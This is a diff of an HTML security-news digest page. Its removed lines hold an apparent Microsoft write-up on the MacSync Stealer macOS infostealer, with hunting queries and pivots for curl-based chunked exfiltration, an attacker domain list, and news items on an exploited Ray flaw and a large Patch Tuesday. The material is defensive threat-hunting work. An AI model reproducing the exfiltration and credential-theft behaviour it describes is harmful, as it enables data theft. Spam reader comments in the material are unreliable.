-| Data Collection | Malware collects browser credentials, cookies, session data, Keychain-related material, cloud credentials, SSH keys, Apple Notes, browser profiles, browsing history, and sensitive files from common user directories. Collected data is staged and archived before upload. | Microsoft Defender for Endpoint – Suspicious access of sensitive files – Suspicious process collected datafrom local system – Enumeration of files with sensitive data – Suspicious archive creation – Suspicious path deletion Microsoft Defender Antivirus – Behavior:MacOS/SuspPassSteal – Trojan:MacOS/SuspDecodeExec |
-| Defense Evasion | Malware decodes or unpacks payload content and removes temporary archives, staging folders, lock files, and other artifacts after exfiltration. | Microsoft Defender for Endpoint – Suspicious path deletion – Suspicious file or information obfuscation detected |
-| Credential Access | Malware accesses Keychain-related material, browser Safe Storage keys, browser credential stores, locally stored credentials, SSH keys, and cloud credential files. | Microsoft Defender for Endpoint – Suspicious access of sensitive files – Unix credentials were illegitimately accessed |
-| Exfiltration | Malware uploads staged archive chunks using curl with HTTP PUT, –data-binary, API-key headers, macOS User-Agent strings, upload_id, chunk_index, and total_chunks parameters. | Microsoft Defender for Endpoint – Possible data exfiltration using curl Microsoft Defender Antivirus – Behavior:MacOS/SuspInfoExfil – Trojan:MacOS/SuspMacSyncExfil |
-Threat intelligence reports
-Microsoft customers can use the following reports in Microsoft products to get the most up-to-date information about the threat, malicious activity, infrastructure, and techniques discussed in this blog. These reports provide intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments.
-Microsoft Defender XDR Threat analytics
-[From ClickFix to code signed: the quiet shift of MacSync Stealer malware.](https://security.microsoft.com/intel-explorer/articles/eb1efeeb)
-Microsoft Security Copilot customers can also use the [Microsoft Security Copilot integration](https://learn.microsoft.com/defender/threat-intelligence/security-copilot-and-defender-threat-intelligence?bc=%2Fsecurity-copilot%2Fbreadcrumb%2Ftoc.json&toc=%2Fsecurity-copilot%2Ftoc.json#turn-on-the-security-copilot-integration-in-defender-ti) in Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in the [embedded experience](https://learn.microsoft.com/defender/threat-intelligence/using-copilot-threat-intelligence-defender-xdr) in the Microsoft Defender portal to get more information about this threat.
-Advanced hunting queries
-The following advanced hunting queries can help identify MacSync Stealer behaviors observed with this threat. Use these queries as starting points and tune the time range, device scope, and allowlists for your environment.
-Hunting objective: Identify rotating infrastructure by request shape
-This query looks for curl-initiated network activity that matches recurring MacSync Stealer URI paths and upload parameters across domains.
-1 2 3 | DeviceNetworkEvents | where InitiatingProcessFileName =~ "curl" | where RemoteUrl has_any ("/curl/", "/dynamic?txd=", "/gate?buildtxd=", "upload_id=", "chunk_index=", "total_chunks=") |
-Hunting objective: Detect payload retrieval over /curl/
-This query focuses on initial payload retrieval behavior where curl reaches a /curl/ path, helping identify delivery activity without relying on a specific domain.
-1 2 3 | DeviceNetworkEvents | where InitiatingProcessFileName =~ "curl" | where RemoteUrl has "/curl/" |
-Hunting objective: Detect chunked exfiltration over curl HTTP PUT
-This query targets active exfiltration behavior by looking for curl HTTP PUT uploads that use –data-binary and chunked upload parameters.
-1 2 3 4 | DeviceNetworkEvents | where InitiatingProcessFileName =~ "curl" | where InitiatingProcessCommandLine has_all ("-X PUT", "--data-binary") | where RemoteUrl has_any ("upload_id=", "chunk_index=", "total_chunks=", "/gate?buildtxd=") |
-Hunting objective: Find curl command lines with MacSync infrastructure traits
-This query searches endpoint process telemetry for curl command lines containing the headers, URI paths, and upload parameters used as durable behavioral pivots.
-1 2 3 | DeviceProcessEvents | where FileName =~ "curl" | where ProcessCommandLine has_any ("api-key", "/curl/", "/dynamic", "/gate", "--data-binary", "upload_id=", "chunk_index=", "total_chunks=", "%{http_code}") |
-Hunting objective: Identify AppleScript-launched shell activity
-This query looks for osascript activity that launches shell commands or native utilities commonly seen in the observed post-execution chain.
-1 2 3 | DeviceProcessEvents | where FileName =~ "osascript" | where ProcessCommandLine has_any ("sh -c", "cp ", "rm ", "curl ", "mkdir ", "killall", "dscl") |
-MITRE ATT&CK techniques observed
-The following MITRE ATT&CK mappings reflect behaviors observed during the MacSync Stealer investigation. The mapping emphasizes the same behavioral pivots used throughout this blog, including shell and AppleScript-assisted execution, payload retrieval, credential and browser data theft, sensitive file collection, staging, chunked exfiltration, cleanup, and rotating infrastructure.
-Execution
-- T1059.004 Command and Scripting Interpreter: Unix Shell | An interactive zsh terminal session was used to run curl commands, decode or unpack payload content with base64 and gunzip, and execute shell commands.
-- T1105 Ingress Tool Transfer | curl downloaded payload content from attacker-controlled infrastructure using recurring payload retrieval paths.
-Discovery
-- T1082 System Information Discovery | The malware collected host and user information during environment discovery.
-- T1057 Process Discovery | The malware enumerated running processes and system configuration before continuing collection and credential-access activity.
-- T1518 Software Discovery | The malware checked for cryptocurrency wallet applications such as Ledger and Trezor.
-Credential Access
-- T1555.001 Credentials from Password Stores: Keychain | The malware created a temporary keychain-grabbing script, attempted to extract browser Safe Storage keys, and accessed or attempted to unlock the macOS Keychain.
-- T1555.003 Credentials from Password Stores: Credentials from Web Browsers | The malware collected browser credentials, cookies, login databases, session data, IndexedDB, LevelDB, and extension storage from Chrome, Brave, Edge, Opera, Vivaldi, Arc, Chromium, and other browsers.
-Collection
-- T1005 Data from Local System | The malware searched Downloads, Documents, and Desktop and collected sensitive file types including PDF, DOCX, TXT, KEY, PEM, KDBX, OVPN, WALLET, and SEED files.
-- T1552.001 Unsecured Credentials: Credentials in Files | The malware harvested SSH keys, AWS credentials, Kubernetes configurations, browser profiles, Apple Notes, Safari data, and other locally stored secrets.
-- T1560.001 Archive Collected Data: Archive via Utility | Collected data was staged under /tmp/sync* and compressed into /tmp/osalogging.zip before upload.
-Command and Control
-- T1071.001 Application Layer Protocol: Web Protocols | C2 communication used web protocols with recurring paths such as /dynamic?txd= and /gate?buildtxd=, macOS User-Agent strings, API-key headers, and rotating domains.
-Exfiltration
-- T1041 Exfiltration Over C2 Channel | Collected data was uploaded to attacker-controlled infrastructure using recurring /gate URI patterns and chunked HTTP PUT requests.
-- T1020 Automated Exfiltration | The malware automated upload activity using curl with HTTP PUT, –data-binary, upload identifiers, chunk_index, and total_chunks parameters.
-- T1030 Data Transfer Size Limits | The archive was split into multiple chunks before upload, as shown by repeated chunk_index and total_chunks parameters in exfiltration requests.
-Defense Evasion
-- T1070.004 Indicator Removal: File Deletion | Temporary archives, staging folders, lock files, and other artifacts were removed after exfiltration.
-- T1140 Deobfuscate/Decode Files or Information | Payload content was decoded or unpacked using base64 and gunzip before execution.
-Behavioral Hunting Pivots
-The following command-line patterns, URL paths, and URL parameters were observed in activity consistent with MacSync Stealer. Use these durable behavioral pivots with process and network context to investigate related activity as infrastructure rotates; then use the point-in-time domain indicators in the IOC section to enrich and validate those findings.
-| Indicator | Type | Description |
-| -H “api-key:” | Command-line parameter | API-key header request pattern used in MacSync Stealer C2 communication. |
-| -H “User-Agent: Mozilla/5.0 (Macintosh” | Command line parameters | macOS User-Agent string used in outbound requests associated with the activity. |
-| -w %{http_code} | Command line parameters | Curl output pattern used to capture HTTP response codes during upload attempts. |
-| -X PUT –data-binary | Command line parameters | HTTP upload pattern associated with data-transfer and exfiltration behavior. |
-| curl -k -s –max-time | Command line parameters | Curl-based C2 check-in pattern that suppresses output, bypasses certificate validation, and limits connection time. |
-| /curl/ | URL path | Payload retrieval path observed in MacSync Stealer command-line activity. |
-| /dynamic?txd= | URL path | Recurring MacSync Stealer URI pattern used for C2 and infrastructure hunting. |
-| /gate?buildtxd= | URL path | Recurring MacSync Stealer URI pattern associated with chunked HTTP PUT data exfiltration. |
-| chunk_index= | URL parameter | Chunk index parameter observed in repeated upload requests. |
-| total_chunks= | URL parameter | Total chunk count parameter observed in chunked upload activity. |
-| upload_id= | URL parameter | Upload session parameter observed during chunked data-transfer activity. |
-Indicators of compromise (IOC)
-The following domain indicators were observed in activity consistent with MacSync Stealer. Treat them as point-in-time evidence: use them to enrich and validate matches from the behavioral pivots above, and correlate any hits with process and network context because related infrastructure may rotate quickly.
-| Indicator | Type | Description |
-| aihealthring [.]com | Domain | Domain observed in activity consistent with MacSync Stealer; use matches to enrich and validate findings from the behavioral pivots above, correlated with process and network context. |
-| cabinrentalsnc [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| chatbasedos [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| commercialroofingsd [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| dogtrainersgeorgia [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| fintelliganceai [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| homeinspectionsdelaware [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| intopython [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| lalandscapelighting [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| lumenagnet [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| marbellaresales [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| miamipcsupport [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| moldinspectiondayton [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| nailscanai [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| newjerseypetsitter [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| numericagent [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| oaklandwaterdamage [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| oklahomawarehousing [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| olympiapetemergency [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| peaecagent [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| plasmaticsystems [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| plethorawallet [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| premierrentalpurchase [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| ricewaterbeauty [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| rvieragent [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| sandiegotkd [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| secueragent [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| shiledagent [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| syracusefertilitycenter [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| vastbets [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-| wvaeagent [.]com | Domain | Related MacSync Stealer infrastructure identified through behavioral hunting. |
-References
-References used for external context and related defensive guidance:
-[MacSync Stealer: C2 Infrastructure Rotation – RST Cloud](https://www.rstcloud.com/macsync-stealer-c2-infrastructure-rotation/). RST Cloud, May 8, 2026.
-[ClickFix campaign uses fake macOS utilities lures to deliver …](https://www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/). Microsoft, May 6, 2026.
-[Protecting against malware in macOS – Apple Support](https://support.apple.com/guide/security/protecting-against-malware-sec469d47bd8/web)December 19, 2024
-Learn more
-For the latest security research from the Microsoft Threat Intelligence community, check out the [Microsoft Threat Intelligence Blog](https://aka.ms/threatintelblog).
-To get notified about new publications and to join discussions on social media, follow us on [LinkedIn](https://www.linkedin.com/showcase/microsoft-threat-intelligence), [X (formerly Twitter)](https://x.com/MsftSecIntel), and [Bluesky](https://bsky.app/profile/threatintel.microsoft.com).
-To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the [Microsoft Threat Intelligence podcast](https://thecyberwire.com/podcasts/microsoft-threat-intelligence).
-Review our documentation to learn more about our real-time protection capabilities and see how to enable them within your organization.
-- Learn more about
-[securing Copilot Studio agents with Microsoft Defender](https://learn.microsoft.com/en-us/defender-cloud-apps/ai-agent-protection) - Evaluate your AI readiness with our latest
-[Zero Trust for AI workshop](https://microsoft.github.io/zerotrustassessment/). [Microsoft 365 Copilot AI security documentation](https://learn.microsoft.com/en-us/copilot/microsoft-365/microsoft-365-copilot-ai-security)[How Microsoft discovers and mitigates evolving attacks against AI guardrails](https://www.microsoft.com/en-us/security/blog/2024/04/11/how-microsoft-discovers-and-mitigates-evolving-attacks-against-ai-guardrails/)</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-2" class="article-body">
+        <div id="art-6" class="article-body">
             <h2 class="article-title">Staying Ahead of Adversarial AI Through Agentic Source Code Review</h2>
             <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/staying-ahead-of-adversarial-ai-through-agentic-source-code-review/" target="_blank">Original Link</a></p>
             <div class="content-text">Staying Ahead of Adversarial AI Through Agentic Source Code Review
@@ -368,37 +306,7 @@ Want a deeper look at how we built and deploy this pipeline in real-world enviro
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-3" class="article-body">
-            <h2 class="article-title">CISA: Windows Task Host flaw now exploited by ransomware gangs</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/cisa-windows-task-host-flaw-now-exploited-by-ransomware-gangs/" target="_blank">Original Link</a></p>
-            <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has confirmed that ransomware gangs are also exploiting a high-severity Windows Task Host vulnerability that was flagged as actively exploited in April. [...]
-
-[Full content could not be extracted. Visit source for details.]</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-4" class="article-body">
-            <h2 class="article-title">CISA Flags Actively Exploited Ray Flaw That Can Trigger Browser-Based RCE</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/08/cisa-flags-actively-exploited-ray-flaw.html" target="_blank">Original Link</a></p>
-            <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Monday [added](https://www.cisa.gov/news-events/alerts/2026/08/17/cisa-adds-one-known-exploited-vulnerability-catalog) a critical flaw impacting Ray to its Known Exploited Vulnerabilities ([KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)) catalog, citing evidence of active exploitation.
-[Ray](https://thehackernews.com/2024/03/critical-unpatched-ray-ai-platform.html) is an open-source, Python-native distributed computing framework designed to scale artificial intelligence and machine learning workloads. As of writing, the [GitHub project](https://github.com/ray-project/ray) has more than 43,500 stars and has been forked over 7,900 times.
-The vulnerability in question relates to [CVE-2025-62593](https://github.com/ray-project/ray/security/advisories/GHSA-q279-jhrf-cc6v) (CVSS score: 9.4), which can result in remote code execution via web browsers like Mozilla Firefox and Apple Safari by means of a [DNS rebinding attack](https://thehackernews.com/2025/06/zero-click-ai-vulnerability-exposes.html).
-"Due to the longstanding decision by the Ray Development team to not implement any sort of authentication on critical endpoints, like the /api/jobs & /api/job_agent/jobs/ has once again led to a severe vulnerability that allows attackers to execute arbitrary code against Ray," according to an advisory shared by Ray maintainers in November 2025. "This time in a development context via the browsers Firefox and Safari."
-The issue, at its core, stems from insufficient controls against browser-based attacks, specifically scenarios where the User-Agent header can be modified.
-"Combined with a DNS rebinding attack against the browser, and this vulnerability is exploitable against a developer running Ray who inadvertently visits a malicious website, or is served a malicious advertisement," the project maintainers added.
-It's worth noting that the defect primarily impacts developers running development/testing environments with Ray. Should a targeted victim fall prey to a phishing attack, or be served a malicious ad, it can lead to the execution of arbitrary shell code on their machine.
-The project maintainers also noted that the attack can also be extended to attack network-adjacent instances of Ray by leveraging the browser as a confused deputy intermediary to target Ray instances running inside a private corporate network.
-The issue has been addressed in version 2.52.0 of the Python package. Ray has credited Oligo security researcher Avi Lumelsky with discovering the fetch bypass and Jonathan Leitschuh for coming up with the DNS rebinding attack.
-CISA has not shared any details of how the vulnerability is being exploited in the wild. However, a [BitSight report](https://thehackernews.com/2026/03/threatsday-bulletin-oauth-trap-edr.html#botnet-exploiting-174-flaws) from March 2026 revealed that the threat actors behind the RondoDox DDoS botnet had incorporated the vulnerability into their arsenal two days before it was publicly disclosed on November 26, 2025, because of the availability of a proof-of-concept (PoC) exploit.
-According to Oligo, unpatched Ray instances have also been at the receiving end of cyber attacks that aim to turn infected clusters with NVIDIA GPUs into a self-replicating cryptocurrency mining botnet as part of a campaign dubbed [ShadowRay 2.0](https://thehackernews.com/2025/11/shadowray-20-exploits-unpatched-ray.html).
-In light of active exploitation of CVE-2025-62593, Federal Civilian Executive Branch (FCEB) agencies are recommended to apply necessary fixes and mitigations by August 20, 2026.
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-5" class="article-body">
+        <div id="art-7" class="article-body">
             <h2 class="article-title">We've Seen This Movie: The OT/IT Technology Divide</h2>
             <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/weve-seen-this-movie-the-ot-it-technology-divide" target="_blank">Original Link</a></p>
             <div class="content-text">We've Seen This Movie: The OT/IT Technology Divide
@@ -457,17 +365,7 @@ If your organization is working through where to start, the Advisory team at Tru
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-6" class="article-body">
-            <h2 class="article-title">Microsoft working on Defender patch for ShieldBreak zero-day</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/microsoft-working-on-defender-patch-for-shieldbreak-zero-day/" target="_blank">Original Link</a></p>
-            <div class="content-text">Microsoft is working on a security patch for the "ShieldBreak" zero-day vulnerability disclosed last week by security researcher "Nightmare Eclipse" and now tracked as CVE-2026-69414. [...]
-
-[Full content could not be extracted. Visit source for details.]</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-7" class="article-body">
+        <div id="art-8" class="article-body">
             <h2 class="article-title">Who’s Tracking You? Use This New Service to Find Out</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/08/whos-tracking-you-use-this-new-service-to-find-out/" target="_blank">Original Link</a></p>
             <div class="content-text">It can be daunting to determine who’s responsible for showing ads on the websites we visit, or who’s harvesting data from the mobile apps we use every day. That information is already semi-public, but it is not easily parsed and traditionally much of it has remained walled away in the hands of large advertising platforms. Not anymore: A powerful and free new service called DecryptAds scrapes and correlates this adtech data and makes it simple to quickly learn a great deal about the entities that are tracking you.
@@ -572,93 +470,50 @@ Tried to register several times with my proton account, nothing ever received.</
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-8" class="article-body">
-            <h2 class="article-title">Turning Enterprise Update Servers Into Backdoor Factories (0_o) – Part 1</h2>
-            <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/" target="_blank">Original Link</a></p>
-            <div class="content-text"><p>TL;DR: This is part 1 of a 2 part blog series sharing what I have discovered in my Windows Service Update Service (WSUS) research. If the WSUS database is configured on a separate server from the upstream WSUS server, we can coerce the WSUS computer account to the WSUS database and establish a SQL session. [&#8230;]</p>
-<p>The post <a href="https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/">Turning Enterprise Update Servers Into Backdoor Factories (0_o) &#8211; Part 1</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
-
-[Full content could not be extracted. Visit source for details.]</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
         <div id="art-9" class="article-body">
-            <h2 class="article-title">Microsoft Patches a Record 570 Security Flaws</h2>
-            <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/07/microsoft-patches-a-record-570-security-flaws/" target="_blank">Original Link</a></p>
-            <div class="content-text">Microsoft Corp. today released software updates to plug at least 570 security holes in its Windows operating systems and other software, almost triple the number of vulnerabilities the software giant fixed in its record-smashing Patch Tuesday release last month. Microsoft attributed the burgeoning patch counts to vulnerability discoveries aided by artificial intelligence.
-Nearly 60 of the bugs quashed in July’s Patch Tuesday earned a “critical” severity rating, meaning miscreants or malware could use them to seize remote control over a Windows device with little or no help from the user. Microsoft also addressed three zero-day flaws, including two that are already being exploited in the wild.
-Two of the zero-day weaknesses allow an attacker to elevate their user rights on a Windows system, as do approximately 250 other elevation of privilege flaws fixed this month; they include [CVE-2026-56155](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-56155) — an Active Directory Federation Services bug — and [CVE-2026-56164](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-56164), a Microsoft Sharepoint vulnerability.
-[CVE-2026-50661](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-50661) is a security feature bypass in Windows BitLocker that could allow attackers to gain access to encrypted data if they have physical access to the device. Microsoft said this bug has been detailed publicly, but that it is not aware of any active exploitation.
-In a blog post on July 9, Microsoft Executive Vice President Pavan Davuluri wrote that Windows users will notice “a higher volume of security updates included in each security release” as a result of AI aiding in the discovery of vulnerabilities.
-“The pace of vulnerability discovery is changing with advances in AI making it possible to find more issues, faster, across more code, with new mechanisms that can accelerate both discovery and analysis,” Davuluri [wrote](https://blogs.windows.com/windowsexperience/2026/07/09/evolving-windows-vulnerability-management-to-meet-the-speed-of-ai-powered-discovery/).
-Jack Bicer, director of vulnerability research at Action1, called attention to [CVE-2026-48561](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-48561), a remote code execution flaw in Microsoft Copilot (with a 9.6 CVSS threat score) that allows an unauthorized attacker to execute code over the network. Microsoft says an attacker could exploit this bug by hosting a malicious website that causes Microsoft Edge for Android to automatically send crafted prompts to Copilot when a user visits the site.
-As AI advances the state of vulnerability discovery and remediation, it is also making it easier for attackers to quickly devise working exploits for known software flaws. Microsoft has long labeled security bugs using its “exploitability index,” which is Redmond’s best guess as to how likely it is that attackers will be able to figure out a reliable way to exploit a given vulnerability.
-But Satnam Narang, senior staff research engineer at Tenable, argues that Microsoft’s exploitability index needs to do a better job of shifting with the machine speed of discovery. For example, Microsoft originally gave this month’s SharePoint zero-day an exploitability rating of “less likely,” although the flaw was [added](https://www.cisa.gov/news-events/alerts/2026/07/01/cisa-adds-one-known-exploited-vulnerability-catalog) to CISA’s Known Exploited Vulnerabilities list on July 1.
-“Anthropic’s Red Team’s own findings for known vulnerabilities (n-days) revealed how fragile this system has become, with its Mythos Preview model being able to produce proof-of-concept exploits for 13 of 14 vulnerabilities that were rated ‘Exploitation Less Likely’ or ‘Exploitation Unlikely,'” Narang said. “What this means is that our way of looking at Patch Tuesday has changed, because the exploitability index is centered around humans, not AI tools, and as these tools continue to improve, defense needs to improve alongside it.”
-Chris Goettl at Ivanti observed that the record patch numbers from Microsoft come as a number of other major software makers are increasing their patch cadence, including Adobe which announced today it is moving to twice-monthly security bulletins published on the 2nd and 4th Tuesday of each month (Adobe also cited AI for accelerating their patch cycles). Cisco, Mozilla and Oracle also are shipping updates more frequently, while Google’s patch batches in June 2026 totaled more than 900 security fixes, Goettl noted.
-Backing up your Windows system and/or data is always a good idea before applying operating system updates. Given the volume of patches addressed this month it may be wise for end users to wait a few days before applying these fixes. It’s not uncommon for security patches to introduce system stability issues, and those chances probably increase quite a bit with the gigantic patch count released today.
-Further reading:
-Still as confused as before … how could there be 570 flaws if Microsoft engineers are the ones doing the programming ? Is it carelessness or intentional ?
-programming without bugs is between hard and impossible
-security is an adversarial task, so bugs will be fund
-Because much of this has existed for years, subtle mistakes made in various different ways that are not so obvious when created as they are when researched. Consider that this spans different languages, generations of people, billions of lines of code.
-NO one person on earth can simply open and view it all. Ai is digging it out by brute force analytics that did not exist when most of it was written.
-Try to butter some bread without crumbs coming off and then get back to me.
-Humans are flawed creatures!
-Those aren’t the only options, extraordinarily confused person.
-An old joke about programming seems appropriate: “Every program has at least one bug and can be shortened by at least one instruction – from which, by induction, one can deduce that every program can be reduced to one instruction which doesn’t work.”
-Appreciate the coverage man! This month was a monster!
-How many of these AI discovered bugs are not really bugs/holes etc., but the fixes will create new, unforeseen problems?
-None.
-Many of the vulnerabilities are from chaining from one weakness to another. It takes humans time to do this, but AI does this much faster.
-Given literally decades of work fixing stability bugs in the Microsoft codebase, it is not surprising these security bugs get now found. It will likely take many of these cycles. And as noted, new defects will be introduced.
-Scrub scrub scrub!
-Nothing interesting to me this Patch Tuesday. Still the same old crap. Good write-up, as per usual. Tired of these sorts of small AI-located bugs still being counted as some sort to pump up numbers, I assume, when they are basically just bugs not flaws. My only MS system showed no improvement. So, your usual Patch Tuesday.
-It has improved security.
-Yawn.
-“Microsoft also addressed three zero-day flaws that are already being exploited in the wild.”
-CVE-2026-50661, according to Microsoft is:
-Publicly disclosed: Yes
-Exploited: No
-Exploitability assessment: Exploitation Less Likely
-https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-50661
-If Microsoft used AI to write a complete Windows replacement OS fresh from the ground up, it would have almost zero security holes, require a lot less maintenance and would do away with tens of thousands of human coding and QA jobs inside Microsoft, meaning more profits for the investors!
-I have done it myself on a local LLM. It is running great (only 100MB in memory) and I think it is very secure. And because it is so great, it doesn’t require maintenance at all!
-Finally built out that qemu win 3.11/wfw instance with stripped out UI?
-They should probably go back to their origins and build from win 98 and windows 2000, perhaps windows XP, and drop any lineage post win 7. Let AI slug it out instead of plopping it down with win 10/win 11.
-Sincerely, that is a better option. I feel like we are not grasping the differences between how we code vs how AI code vs how Ai code vs how Dimon might code. I don’t wanna think about Dimon vibe coding. Thinking about Gates vibe coding suddenly sounds kind of fascinating, though. I do wonder how rich ex developers would vibe code now. I worry about how AI might be interested in how we all vibe code differently. Not so scary locally, damn creepy as a communistic concept. Hoping MS never patches any of my personal bugs/flaws. I am guessing those models are taking notes on the catwalk. :/
-Nonsense. It would be just another one of their expensive fiascos. LLM code generators don’t know secure from insecure, just what they’re trained on. That’s why what drew my eye in Brian’s article was the mention of the “remote code execution flaw in Microsoft Copilot”. Mindless AI shovelware creates more problems than it’ll ever solve. An OS based on it would be a nightmare.
-I think the complete opposite, AI struggles to write working code, let alone code without vulnerabilities.
-Recent studies have shown AI code meets Secure By Design principals 16% of the time after 5 prompts and 17.5% after 10 prompts. So you are suggesting something that would probably reintroduce insecure code from XP in critical components in the thousands.
-As far as saving money, Ford lost a ton trying this: https://www.bbc.com/news/articles/cgrkd41n2v9o
-AI… Are you AI or not?
-Great article and important reminder about the need for regular security updates. With the increasing number of vulnerabilities being discovered, staying informed and using reliable tools has become more important than ever. Resources like https://vanced.com.co/revanced-sync-for-lemmy/ also show how open-source communities continue to create useful solutions for users who value privacy and better digital experiences.
-Impressive. Now let’s compaire: PC Mag, in 1995, reported that M$ was releasing Win95, ->in spite of over 64,000 known bugs and issues<-.
-Do we imagine that number's decreased?
-if you are doing any major SW or HW development (also IC HW is developed with SW tools), and are compiling and then running any verification tool on it, you will always get massive numbers of items flagged as errors / issues / bugs, whatever the tool calls it. Most of these are syntax items that the verification tool may not like or understand.
-A bit like how your car’s “stay-in-the-lane” monitor behaves while you are driving through a construction site and the white stripes are replaced with seemingly contradicting yellow stripes for a lane shift.
-This is a fundamental thing, probably no way around it. The world is very complex, and there are so many corner cases that it is plain impossible (not mathematically impossible, but impossible with limited effort) to develop “fully clean” code.
-Obviously these 622 bugs and flaws have nothing to do with day to day de-bugging and syntax crap.
-Brian’s got some problems with his arithmetic chip also.
-Some publications count the Chromium bugs included in each Patch Tuesday. I generally have not. YMMV.
-That makes sense. I would like to pretend Chromium never existed also.
-Microsoft advisory said, some Dell PC maybe cause loop reboots after July updates
-I got my 570 updates installed! Went smoothly. Took 4 reboots. Everything has been running smoothly for the last day now.
-Ready for you now hackers!
-So AI did the discovery work here. But who triaged the bugs and scored their severity? Also an AI?
-With 570 patches released at once, I’m wondering how many organizations actually have a maintenance plan to test and deploy them without breaking production systems?
-Individually?!
-Thanks for putting this together. The scale of this month’s Patch Tuesday is remarkable, but what I found most useful was the focus on the vulnerabilities that are actually being exploited and deserve immediate attention. It’s a good reminder that keeping systems updated isn’t just routine maintenance anymore, it’s one of the most effective defenses against active threats.
-I found it especially interesting that AI is now accelerating both vulnerability discovery and patch development, but it also seems to be shrinking the window defenders have before attackers can weaponize newly disclosed flaws. Do you think we’re reaching a point where organizations should prioritize patching based on AI-driven exploit predictions instead of traditional severity ratings alone?
-someone depo me $15 ltc ltc1q4vtynfv3spfcymsykrvw5ndvt08636lhyv2nr0
-But did they vibe code this one too? Because I don’t want to have to roll back another set of updates when they break basic stuff.
-In other news, not that it is widely reported, Apple have just released over 500 fixes as well in July’s 26.6 and related releases.
-Given how few platforms Apple has to support compared to Microsoft, proportionally I’d say this was an even bigger release than Microsoft’s July Patch Tuesday.
-AI is definitely a factor in identifying and helping software publishers, deploy products and patches before threat actors take advantage of them.
-It is worth nothing that attacks via vulnerabilities are down, most current breach are based on human errors.
-What vulnerabilities coming a scale, faster than they can identified, organizations needs a comprehensive process for risk management applications like attack surface can help organizations reduce risk
